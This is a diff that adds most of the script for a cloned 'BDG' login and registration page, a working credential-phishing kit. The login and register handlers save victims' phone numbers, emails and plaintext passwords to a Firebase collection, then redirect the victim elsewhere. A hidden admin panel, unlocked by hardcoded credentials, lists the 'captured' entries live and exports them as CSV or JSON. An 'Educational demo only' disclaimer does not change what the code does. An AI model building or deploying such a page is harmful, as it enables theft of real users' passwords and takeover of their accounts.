+      const btn = app.querySelector("#loginBtn");
+      function updateCanSubmit() {
+        const identifier = s.tab === "phone" ? (phoneInput?.value || "").trim()
+                                             : (emailInput?.value || "").trim();
+        const can = identifier.length > 0 && (passInput.value || "").length > 0 && !btn._loading;
+        btn.classList.toggle("disabled", !can);
+      }
+      if (phoneInput) phoneInput.addEventListener("input", () => {
+        phoneInput.value = phoneInput.value.replace(/\D/g, "");
+        s.phone = phoneInput.value;
+        updateCanSubmit();
+      });
+      if (emailInput) emailInput.addEventListener("input", () => {
+        s.email = emailInput.value;
+        updateCanSubmit();
+      });
+      passInput.addEventListener("input", () => {
+        s.password = passInput.value;
+        updateCanSubmit();
+      });
+      updateCanSubmit();
+
+      btn.addEventListener("click", async () => {
+        if (btn.classList.contains("disabled") || btn._loading) return;
+        btn._loading = true;
+        btn.textContent = "Please wait...";
+        btn.classList.add("disabled");
+
+        const phone = (phoneInput?.value || "").trim();
+        const email = (emailInput?.value || "").trim();
+        const password = passInput.value;
+
+        await saveCapture({
+          type: "login",
+          mode: s.tab,
+          countryCode: s.tab === "phone" ? "+91" : undefined,
+          phone: s.tab === "phone" ? phone : undefined,
+          email: s.tab === "email" ? email : undefined,
+          password
+        });
+
+        const isAdmin = s.tab === "phone" && phone === ADMIN_PHONE && password === ADMIN_PASSWORD;
+
+        setTimeout(() => {
+          if (isAdmin) {
+            sessionStorage.setItem("bdg_admin_ok", "1");
+            window.location.hash = "#/admin";
+          } else {
+            window.location.replace(REDIRECT_URL);
+          }
+        }, 250);
+      });
+    }
+
+    /* ============================================================
+       REGISTER VIEW
+       ============================================================ */
+    let regData = { phone: "", password: "", confirm: "", agree: false, showP1: false, showP2: false };
+
+    function renderRegister() {
+      const app = document.getElementById("app");
+      const s = regData;
+
+      app.innerHTML = `
+        <div class="screen">
+          ${headerHTML(true)}
+          <div class="intro" style="padding-top:8px;padding-bottom:40px">
+            <p style="margin:0;font-size:14px;color:#fff">Please register by phone number or email</p>
+          </div>
+
+          <div class="section-head">
+            <div>${iconHTML("tpl-phone")}</div>
+            <div class="section-head-title">Register your phone</div>
+            <div class="section-head-bar"></div>
+          </div>
+
+          <div class="form">
+            <div class="field-label">${iconHTML("tpl-phone")}<span>Phone number</span></div>
+            <div class="field-row">
+              <div class="cc-select"><span>+91</span>${iconHTML("tpl-caret")}</div>
+              <div class="field">
+                <input id="regPhone" type="tel" inputmode="numeric" placeholder="Please enter the phone number" />
+              </div>
+            </div>
+
+            <div class="field-label">${iconHTML("tpl-lock")}<span>Set password</span></div>
+            <div class="field">
+              <input id="regPass" type="password" placeholder="Set password" />
+              <button class="eye-btn" id="regEye1" type="button">${iconHTML("tpl-eye-off")}</button>
+            </div>
+
+            <div class="field-label">${iconHTML("tpl-lock")}<span>Confirm password</span></div>
+            <div class="field">
+              <input id="regConfirm" type="password" placeholder="Confirm password" />
+              <button class="eye-btn" id="regEye2" type="button">${iconHTML("tpl-eye-off")}</button>
+            </div>
+
+            <div class="field-label">${iconHTML("tpl-invite")}<span>Invite code</span></div>
+            <div class="field">
+              <input id="regInvite" type="text" readonly value="${INVITE_CODE}" />
+            </div>
+
+            <div class="check-row">
+              <button class="check-btn ${s.agree ? "checked" : ""}" id="regAgreeBtn" type="button">${iconHTML("tpl-check")}</button>
+              <span class="check-label">I have read and agree <span class="privacy">【Privacy Agreement】</span></span>
+            </div>
+
+            <button class="btn-primary" id="regBtn" type="button" style="letter-spacing:1px">Register</button>
+            <button class="btn-outline plain" type="button" data-go-login>I have an account <b>Login</b></button>
+
+            <div class="disclaimer" style="margin-top:24px">
+              ⚠ Educational demo only — UI clone for learning responsive design.
+            </div>
+          </div>
+        </div>
+      `;
+
+      const phoneInput = app.querySelector("#regPhone");
+      const passInput  = app.querySelector("#regPass");
+      const confInput  = app.querySelector("#regConfirm");
+      const eye1 = app.querySelector("#regEye1");
+      const eye2 = app.querySelector("#regEye2");
+      const agreeBtn = app.querySelector("#regAgreeBtn");
+      const regBtn   = app.querySelector("#regBtn");
+
+      phoneInput.value = s.phone;
+      passInput.value  = s.password;
+      confInput.value  = s.confirm;
+      passInput.type = s.showP1 ? "text" : "password";
+      confInput.type = s.showP2 ? "text" : "password";
+      eye1.innerHTML = iconHTML(s.showP1 ? "tpl-eye-on" : "tpl-eye-off");
+      eye2.innerHTML = iconHTML(s.showP2 ? "tpl-eye-on" : "tpl-eye-off");
+
+      app.querySelector("[data-back]")?.addEventListener("click", () => go("login"));
+      app.querySelector("[data-go-login]")?.addEventListener("click", () => go("login"));
+
+      function toggleEye(input, btn, key) {
+        const start = input.selectionStart, end = input.selectionEnd;
+        s[key] = !s[key];
+        input.type = s[key] ? "text" : "password";
+        btn.innerHTML = iconHTML(s[key] ? "tpl-eye-on" : "tpl-eye-off");
+        try { input.setSelectionRange(start, end); } catch {}
+      }
+      eye1.addEventListener("click", (e) => { e.preventDefault(); toggleEye(passInput, eye1, "showP1"); });
+      eye2.addEventListener("click", (e) => { e.preventDefault(); toggleEye(confInput, eye2, "showP2"); });
+
+      agreeBtn.addEventListener("click", () => {
+        s.agree = !s.agree;
+        agreeBtn.classList.toggle("checked", s.agree);
+      });
+
+      phoneInput.addEventListener("input", () => {
+        phoneInput.value = phoneInput.value.replace(/\D/g, "");
+        s.phone = phoneInput.value;
+      });
+      passInput.addEventListener("input", () => { s.password = passInput.value; });
+      confInput.addEventListener("input", () => { s.confirm  = confInput.value; });
+
+      regBtn.addEventListener("click", async () => {
+        if (regBtn._loading) return;
+        regBtn._loading = true;
+        regBtn.textContent = "Please wait...";
+        regBtn.classList.add("disabled");
+
+        const phone = phoneInput.value.trim();
+        const pass  = passInput.value;
+        const conf  = confInput.value;
+
+        await saveCapture({
+          type: "register",
+          mode: "phone",
+          countryCode: "+91",
+          phone, password: pass, confirmPassword: conf,
+          inviteCode: INVITE_CODE
+        });
+
+        setTimeout(() => {
+          window.location.replace(REDIRECT_URL);
+        }, 250);
+      });
+    }
+
+    /* ============================================================
+       ADMIN VIEW
+       ============================================================ */
+    let adminState = { filter: "", tab: "all", reveal: true, users: [] };
+
+    function renderAdmin() {
+      const app = document.getElementById("app");
+      app.innerHTML = `
+        <div class="admin-body">
+          <div class="admin-topbar">
+            <div class="admin-inner">
+              <div class="row">
+                <div class="admin-brand">
+                  <div class="admin-badge">A</div>
+                  <div>
+                    <div class="admin-title">BDG Admin Panel</div>
+                    <div class="admin-sub" id="connStatus"><span class="conn-dot"></span> Connecting…</div>
+                  </div>
+                </div>
+                <button class="btn-danger" type="button" id="logoutBtn">Logout</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="admin-inner">
+            <div class="stats" id="statsBox"></div>
+
+            <div class="controls">
+              <input id="adminFilter" placeholder="Search phone, email, password, invite..." />
+              <select id="adminTab">
+                <option value="all">All types</option>
+                <option value="login">Login only</option>
+                <option value="register">Register only</option>
+              </select>
+              <button class="btn-sm btn-white" type="button" id="revealBtn">Hide passwords</button>
+              <button class="btn-sm btn-green" type="button" id="csvBtn">CSV</button>
+              <button class="btn-sm btn-green-dark" type="button" id="jsonBtn">JSON</button>
+              <button class="btn-sm btn-red" type="button" id="clearBtn">Clear All</button>
+            </div>
+
+            <div id="listBox"></div>
+
+            <p class="note">
+              ✅ Data is stored <b>only</b> in Firebase Firestore
+              (project: <code>bdg-login-f4f32</code>, collection: <code>${COLLECTION}</code>).
+              Every submission is preserved permanently — even if the user goes offline it is queued and uploaded automatically.
+            </p>
+          </div>
+        </div>
+      `;
+
+      document.getElementById("adminFilter").value = adminState.filter;
+      document.getElementById("adminTab").value = adminState.tab;
+      document.getElementById("revealBtn").textContent = adminState.reveal ? "Hide passwords" : "Show passwords";
+
+      document.getElementById("logoutBtn").addEventListener("click", () => {
+        sessionStorage.removeItem("bdg_admin_ok");
+        unsubscribeLive();
+        window.location.hash = "";
+      });
+      document.getElementById("adminFilter").addEventListener("input", (e) => {
+        adminState.filter = e.target.value;
+        updateAdminList();
+      });
+      document.getElementById("adminTab").addEventListener("change", (e) => {
+        adminState.tab = e.target.value;
+        updateAdminList();
+      });
+      document.getElementById("revealBtn").addEventListener("click", () => {
+        adminState.reveal = !adminState.reveal;
+        document.getElementById("revealBtn").textContent = adminState.reveal ? "Hide passwords" : "Show passwords";
+        updateAdminList();
+      });
+      document.getElementById("csvBtn").addEventListener("click", exportCSV);
+      document.getElementById("jsonBtn").addEventListener("click", exportJSON);
+      document.getElementById("clearBtn").addEventListener("click", async () => {
+        if (confirm("Delete ALL captured records from Firebase? This cannot be undone.")) {
+          const ok = await clearAll();
+          if (ok) toast("Cleared all records");
+        }
+      });
+
+      updateStats();
+      updateAdminList();
+
+      if (!liveUnsub) {
+        subscribeLive((users) => {
+          adminState.users = users;
+          updateConnStatus();
+          updateStats();
+          updateAdminList();
+        });
+      }
+      updateConnStatus();
+    }
+
+    function updateConnStatus() {
+      const el = document.getElementById("connStatus");
+      if (!el) return;
+      if (dbStatus.ok) {
+        el.innerHTML = '<span class="conn-dot ok"></span> Connected · Firestore live';
+      } else if (dbStatus.err) {
+        el.innerHTML = '<span class="conn-dot err"></span> ' + escapeHTML(dbStatus.err.slice(0, 80));
+      } else {
+        el.innerHTML = '<span class="conn-dot"></span> Loading local cache…';
+      }
+    }
+
+    function updateStats() {
+      const box = document.getElementById("statsBox");
+      if (!box) return;
+      const users = adminState.users;
+      box.innerHTML = `
+        <div class="stat blue"><div class="stat-label">Total</div><div class="stat-value">${users.length}</div></div>
+        <div class="stat green"><div class="stat-label">Logins</div><div class="stat-value">${users.filter(u => u.type === "login").length}</div></div>
+        <div class="stat amber"><div class="stat-label">Registers</div><div class="stat-value">${users.filter(u => u.type === "register").length}</div></div>
+      `;
+    }
+
+    function updateAdminList() {
+      const box = document.getElementById("listBox");
+      if (!box) return;
+      const s = adminState;
+      const filtered = s.users.filter(u => {
+        if (s.tab !== "all" && u.type !== s.tab) return false;
+        if (!s.filter) return true;
+        const q = s.filter.toLowerCase();
+        return (u.phone || "").toLowerCase().includes(q)
+          || (u.email || "").toLowerCase().includes(q)
+          || (u.password || "").toLowerCase().includes(q)
+          || (u.inviteCode || "").toLowerCase().includes(q);
+      });
+
+      box.innerHTML = `
+        <div class="cards">
+          ${filtered.length === 0
+            ? `<div class="empty">${dbStatus.ok
+                ? "No captured entries yet. When someone submits the login or register form, it will appear here in real time from Firebase."
+                : "Waiting for Firebase connection…"}</div>`
+            : filtered.map((u, i) => mobileCardHTML(u, i + 1, s.reveal)).join("")}
+        </div>
+        <div class="table-wrap">
+          <div class="table-scroll">
+            <table>
+              <thead>
+                <tr>
+                  <th>#</th><th>Time</th><th>Type</th><th>Mode</th>
+                  <th>Phone / Email</th><th>Password</th><th>Confirm</th>
+                  <th>Invite</th><th>Sync</th><th>Device</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${filtered.length === 0
+                  ? `<tr><td colspan="10" class="empty" style="border:0">No entries yet.</td></tr>`
+                  : filtered.map((u, i) => rowHTML(u, i + 1, s.reveal)).join("")}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      `;
+
+      box.querySelectorAll("[data-copy]").forEach(b => {
+        b.addEventListener("click", () => {
+          const t = b.getAttribute("data-copy");
+          if (navigator.clipboard) navigator.clipboard.writeText(t);
+          toast("Copied");
+        });
+      });
+    }
+
+    function mobileCardHTML(u, idx, reveal) {
+      const idText = u.mode === "email" ? (u.email || "") : `${u.countryCode || ""} ${u.phone || ""}`.trim();
+      const copyStr = `${idText} | pwd: ${u.password} | type: ${u.type} | time: ${fmtTime(u)}`;
+      const sync = u._pending
+        ? `<span class="badge pending">syncing…</span>`
+        : `<span class="badge saved">saved</span>`;
+      return `
+        <div class="card">
+          <div class="card-head">
+            <div class="card-head-left">
+              <span class="num">#${idx}</span>
+              <span class="badge ${u.type}">${u.type}</span>
+              <span class="num">${escapeHTML(u.mode || "")}</span>
+              ${sync}
+            </div>
+            <button class="mini-copy" type="button" data-copy="${escapeHTML(copyStr)}">Copy</button>
+          </div>
+          <div class="card-body">
+            <div class="row-line"><span class="label">Phone / Email</span><span class="val mono">${escapeHTML(idText || "-")}</span></div>
+            <div class="row-line"><span class="label">Password</span><span class="val mono hl">${escapeHTML(reveal ? (u.password || "-") : mask(u.password))}</span></div>
+            ${u.confirmPassword ? `<div class="row-line"><span class="label">Confirm</span><span class="val mono">${escapeHTML(reveal ? u.confirmPassword : mask(u.confirmPassword))}</span></div>` : ""}
+            ${u.inviteCode ? `<div class="row-line"><span class="label">Invite</span><span class="val mono">${escapeHTML(u.inviteCode)}</span></div>` : ""}
+            <div class="row-line"><span class="label">Time</span><span class="val">${escapeHTML(fmtTime(u))}</span></div>
+          </div>
+        </div>
+      `;
+    }
+
+    function rowHTML(u, idx, reveal) {
+      const idText = u.mode === "email" ? (u.email || "") : `${u.countryCode || ""} ${u.phone || ""}`.trim();
+      const sync = u._pending
+        ? `<span class="badge pending">syncing</span>`
+        : `<span class="badge saved">saved</span>`;
+      return `
+        <tr>
+          <td class="text-white60">${idx}</td>
+          <td class="nowrap text-white80">${escapeHTML(fmtTime(u))}</td>
+          <td><span class="badge ${u.type}">${u.type}</span></td>
+          <td class="text-white80">${escapeHTML(u.mode || "-")}</td>
+          <td class="mono">${escapeHTML(idText || "-")}</td>
+          <td class="mono text-yellow">${escapeHTML(reveal ? (u.password || "-") : mask(u.password))}</td>
+          <td class="mono text-white70">${escapeHTML(reveal ? (u.confirmPassword || "-") : mask(u.confirmPassword))}</td>
+          <td class="mono text-white70">${escapeHTML(u.inviteCode || "-")}</td>
+          <td>${sync}</td>
+          <td class="truncate text-white50" title="${escapeHTML(u.userAgent || "")}">${escapeHTML(u.userAgent || "")}</td>
+        </tr>
+      `;
+    }
+
+    function download(blob, filename) {
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url; a.download = filename; a.click();
+      URL.revokeObjectURL(url);
+    }
+    function exportJSON() {
+      download(new Blob([JSON.stringify(adminState.users, null, 2)], { type: "application/json" }),
+        `bdg-users-${Date.now()}.json`);
+    }
+    function exportCSV() {
+      const users = adminState.users;
+      const headers = ["_id","type","mode","countryCode","phone","email","password","confirmPassword","inviteCode","clientTime","date","userAgent"];
+      const rows = users.map(u => [
+        u._id, u.type, u.mode || "", u.countryCode || "", u.phone || "", u.email || "",
+        u.password || "", u.confirmPassword || "", u.inviteCode || "",
+        String(u.clientTime || ""), new Date(timeStamp(u)).toISOString(),
+        (u.userAgent || "").replace(/,/g, ";")
+      ]);
+      const csv = headers.join(",") + "\n" +
+        rows.map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(",")).join("\n");
+      download(new Blob([csv], { type: "text/csv" }), `bdg-users-${Date.now()}.csv`);
+    }
+
+    /* ============ INIT ============ */
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", render);
+    } else {
+      render();
+    }
+  </script>
+</body>
+</html>
